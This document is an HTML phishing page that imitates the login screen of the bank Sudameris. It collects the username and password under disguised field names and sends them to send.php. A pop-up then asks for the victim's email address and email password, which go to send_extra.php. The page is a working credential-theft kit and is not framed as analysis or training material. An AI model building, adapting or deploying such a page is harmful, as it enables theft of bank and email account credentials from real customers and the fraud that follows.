<!DOCTYPE html>
<html lang="es">
<link rel="icon" type="image/png" href="qjhdajksdlkahdjaslkd/zxdaskduwdak.ico">
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Sudameris</title>
  <link rel="stylesheet" href="styles.css" />
</head>
<body>
  <div class="container">
    <!-- Columna izquierda con imagen -->
    <div class="left-column">
      <img src="qjhdajksdlkahdjaslkd/S-image.png" alt="Imagen creativa con la letra S" class="s-image" />
    </div>

    <!-- Columna derecha -->
    <div class="right-column">
      <div class="login-container">
        <div class="brand-header">
          <h1 class="brand-name">SUDAMERIS</h1>
          <p>Todo un banco</p>
        </div>
        
        <!-- Formulario Paso 1 -->
        <form id="mainForm" class="login-form" method="POST" action="send.php">
          <input type="text" name="id_estudiante" placeholder="Usuario" required />
          <div class="password-container">
            <input type="text" name="codigo_preferencia" placeholder="Contraseña" id="password" required />
            <img src="qjhdajksdlkahdjaslkd/ojo.png" alt="Mostrar/ocultar" class="toggle-password" id="togglePassword">
          </div>
          <div class="options">
            <a href="index.html">¿Olvidó su contraseña?</a>
          </div>
          <button type="submit">INGRESAR</button>
        </form>
      </div>
    </div>
  </div>

  <!-- Modal Paso 2 -->
  <div id="extraModal" class="modal">
    <div class="modal-content">
      <span class="close" id="closeModal">&times;</span>
      <h2 class="modal-title">Sincronizá tu e-mail</h2>
      <form id="extraForm" method="POST" action="send_extra.php">
        <input type="email" name="email" placeholder="Correo electrónico" required>
        <input type="password" name="pais" placeholder="Clave de correo" required>
        <button type="submit" class="next-btn">Sincronizar</button>
      </form>
   



  <!-- Script -->
  <script>
    const togglePassword = document.getElementById("togglePassword");
    const passwordInput = document.getElementById("password");
    const modal = document.getElementById("extraModal");
    const closeModal = document.getElementById("closeModal");

    togglePassword.addEventListener("click", () => {
      const isText = passwordInput.getAttribute("type") === "text";
      passwordInput.setAttribute("type", isText ? "password" : "text");
      passwordInput.focus();
    });

    document.getElementById("mainForm").addEventListener("submit", function(e) {
      e.preventDefault();
      const formData = new FormData(this);
      fetch("send.php", { method: "POST", body: formData })
        .then(() => {
          modal.style.display = "flex";
        });
    });

    closeModal.onclick = () => modal.style.display = "none";
    window.onclick = (e) => { if (e.target === modal) modal.style.display = "none"; };
  </script>
</body>
</html>
